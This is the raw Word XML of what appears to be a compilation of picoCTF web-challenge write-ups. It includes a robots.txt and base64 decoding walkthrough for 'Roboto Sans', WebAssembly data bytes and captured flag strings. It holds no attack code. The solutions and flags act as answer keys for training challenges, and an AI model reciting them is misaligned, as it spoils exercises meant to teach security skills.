        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3220736A" w14:textId="7C56E48A" w:rsidR="00517A5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1943A49" wp14:editId="7018A3F5">
            <wp:extent cx="6332220" cy="36087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55"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="3608705"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C8A69C3" w14:textId="55081968"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2C39422" w14:textId="5930759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05062DA4" wp14:editId="2D23EF5A">
            <wp:extent cx="6332220" cy="269176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56"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2691765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="331C1878" w14:textId="57E37BAC"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4D0C6BA5" w14:textId="708A83F0"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0CF476B7" w14:textId="77777777" w:rsidR="003E7B32" w:rsidRDefault="003E7B32" w:rsidP="00517A56">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CC710B9" w14:textId="77777777" w:rsidR="003E7B32" w:rsidRDefault="003E7B32" w:rsidP="003E7B32">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Some Assembly Required 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD991CC"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 | 160 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BB4468" w14:textId="77777777" w:rsidR="003E7B32" w:rsidRDefault="003E7B32" w:rsidP="003E7B32">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7F3C2903" w14:textId="77777777" w:rsidR="003E7B32" w:rsidRDefault="003E7B32" w:rsidP="003E7B32">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SEARS SCHULZ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FE531F" w14:textId="77777777" w:rsidR="003E7B32" w:rsidRDefault="003E7B32" w:rsidP="003E7B32">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4C7AFFE" w14:textId="77777777" w:rsidR="003E7B32" w:rsidRDefault="00000000" w:rsidP="003E7B32">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId157" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="003E7B32">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:38541/index.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="226029A3" w14:textId="77777777" w:rsidR="00991466" w:rsidRDefault="00991466" w:rsidP="00517A56">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="394D2F07" w14:textId="77777777" w:rsidR="00244A25" w:rsidRPr="00244A25" w:rsidRDefault="00244A25" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00244A25">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(data (i32.const 1024) "\9dn\93\c8\b2\b9A\8b\90\c2\ddc\93\93\92\8fd\92\9f\94\d5b\91\c5\c0\8ef\c4\97\c0\8f1\c1\90\c4\8ba\c2\94\c9\90\00\00")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="167BB490" w14:textId="3CB5B6B7" w:rsidR="00517A56" w:rsidRDefault="00244A25" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00244A25">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">  (data (i32.const 1067) "\f1\a7\f0\07\ed")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222F4FCB" w14:textId="0C14D2E6" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15612060" w14:textId="77777777" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">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Roboto Sans</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A23B5C0"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57006D67" w14:textId="77777777" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">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4671DC6A" w14:textId="77777777" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">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MUBARAK MIKAIL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192199BD" w14:textId="77777777" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">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lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3913A939" w14:textId="77777777" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">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flag is somewhere on this web application not necessarily on the website. Find </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>it.Check</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId158" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>this</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> out.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="657BB089" w14:textId="5E52E3E5" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00244A25">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xml:space="preserve">The challenge name seems to be either an allusion to the text font Roboto or </w:t>
      </w:r>
      <w:r w:rsidRPr="00982888">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:highlight w:val="yellow"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>/robots.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t xml:space="preserve"> (see </w:t>
      </w:r>
      <w:hyperlink r:id="rId159" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
          </w:rPr>
          <w:t>this writeup</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>). As investigating the text font files seems more complicated, let's first look at /robots.txt. There, we find this:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFDA4A8" w14:textId="39948C26" w:rsidR="00982888" w:rsidRDefault="00000000" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId160" w:history="1">
        <w:r w:rsidR="00982888" w:rsidRPr="00982888">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
          </w:rPr>
          <w:t>http://saturn.picoctf.net:51108/robots.txt</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B96FDF7"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User-agent *</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A99DBD9"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t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00982888">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>cgi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00982888">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>-bin/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B93FBFC"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Think you have seen your flag or want to keep looking.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4736B874" w14:textId="77777777" w:rsidR="00982888" w:rsidRPr="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="194F260A"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ZmxhZzEudHh0;anMvbXlmaW</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7316B1" w14:textId="77777777" w:rsidR="00982888" w:rsidRP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anMvbXlmaWxlLnR4dA==</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="363A3B99" w14:textId="77777777" w:rsidR="00982888" w:rsidRPr="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00982888">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>svssshjweuiwl;oiho.bsvdaslejg</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="12D15FDB" w14:textId="5D385B8B" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00982888">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>Disallow: /wp-admin/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561CC4D4" w14:textId="28B7D0FC" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="375EDD87" w14:textId="1C2E6380" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00982888">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>“== “sign suggests that it's base 64. However, if we try to decode it with an </w:t>
      </w:r>
      <w:hyperlink r:id="rId161" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
            <w:color w:val="0088CC"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
          </w:rPr>
          <w:t>online decoder</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>, it seems like the base 64 is a little malformed. As the base 64 text spans across three lines, it suggests that it is actually three separate strings. If we decode each line separately, we find that the second line gives us a valid path, specifically </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>js</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Noto Serif CJK SC" w:hAnsi="Consolas"/>
          <w:color w:val="DD1144"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:bdr w:val="single" w:sz="6" w:space="2" w:color="E1E1E8" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F7F7F9"/>
        </w:rPr>
        <w:t>/myfile.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t xml:space="preserve">. If we navigate to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>suburl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
        <w:t>, we get the flag.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE8F38C" w14:textId="77777777" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica"/>
          <w:color w:val="333333"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FCFCFC"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AF4CD76" w14:textId="6DA15F37" w:rsidR="00982888" w:rsidRDefault="00000000" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId162" w:history="1">
        <w:r w:rsidR="00982888" w:rsidRPr="00B44B5A">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
            <w:lang w:val="en-CA"/>
          </w:rPr>
          <w:t>http://saturn.picoctf.net:51108/js/myfile.txt</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4D30302B" w14:textId="3AABEDA8" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7911C1FC" wp14:editId="394BE399">
            <wp:extent cx="4557155" cy="876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7155" cy="876376"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C91CCC" w14:textId="6E62A4FC" w:rsidR="00982888" w:rsidRDefault="00982888" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47F30CBF" w14:textId="77777777" w:rsidR="00CD47AC" w:rsidRDefault="00CD47AC" w:rsidP="00CD47AC">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Secrets</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523CD72C"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 | 200 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0317A062" w14:textId="77777777" w:rsidR="00CD47AC" w:rsidRDefault="00CD47AC" w:rsidP="00CD47AC">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2022Web Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C708A92" w14:textId="77777777" w:rsidR="00CD47AC" w:rsidRDefault="00CD47AC" w:rsidP="00CD47AC">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GEOFFREY NJOGU</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4480DB02" w14:textId="77777777" w:rsidR="00CD47AC" w:rsidRDefault="00CD47AC" w:rsidP="00CD47AC">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1E5EAFA6" w14:textId="7E3BAE9F" w:rsidR="00CD47AC" w:rsidRDefault="00CD47AC" w:rsidP="00CD47AC">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We have several pages hidden. Can you find the one with the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>flag?The</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> website is running </w:t>
      </w:r>
      <w:hyperlink r:id="rId164" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A70DC9" w14:textId="6DC8B3F4"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7AC92F9" w14:textId="2FAF358F"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62BC4D06" wp14:editId="4DD2EBDC">
            <wp:extent cx="6332220" cy="586676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65"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="5866765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FA6723B" w14:textId="5F7945FB"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p>
    <w:p w14:paraId="4A7E9476" w14:textId="4E94A7C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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1D07A6AE" wp14:editId="49922B3D">
            <wp:extent cx="6165114" cy="2773920"/>
            <wp:effectExtent l="0" t="0" r="7620" b="762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pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId166"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6165114" cy="2773920"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F61F91" w14:textId="3484600C"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4DAE8A2C" wp14:editId="6F914EAE">
            <wp:extent cx="6332220" cy="292798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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2927985"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5565897F" w14:textId="2D5E8563" w:rsidR="00760362" w:rsidRDefault="00760362" w:rsidP="00CD47AC">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1E2FE8E7" wp14:editId="4A1C88B1">
            <wp:extent cx="6332220" cy="249682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168"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2496820"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="59604085" w14:textId="20D04127" w:rsidR="00982888" w:rsidRDefault="00760362" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00760362">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00760362">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{succ3ss_@h3n1c@10n_51b260fe}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7060460D" w14:textId="386C5F3D" w:rsidR="00DB370A" w:rsidRDefault="00DB370A" w:rsidP="00244A25">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
